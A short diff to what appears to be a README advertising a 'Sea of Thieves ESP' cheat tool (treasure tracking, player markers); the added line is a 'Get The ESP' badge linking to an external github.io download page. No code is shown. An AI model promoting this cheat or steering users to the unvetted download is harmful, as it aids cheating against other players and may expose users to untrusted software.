@@ -4,6 +4,7 @@
 
 Sea of Thieves ESP is the cheat tool every pirate dreams of. With treasure tracking, ship overlays, and player markers, ESP gives you complete awareness of the map. No more blind looting or getting ambushed—ESP puts you in control of every adventure.
 
+[![Get](https://img.shields.io/badge/Get%20The-ESP-blueviolet)](https://sea-of-thieves-esp-tool.github.io/.github/)
 
 ---
 
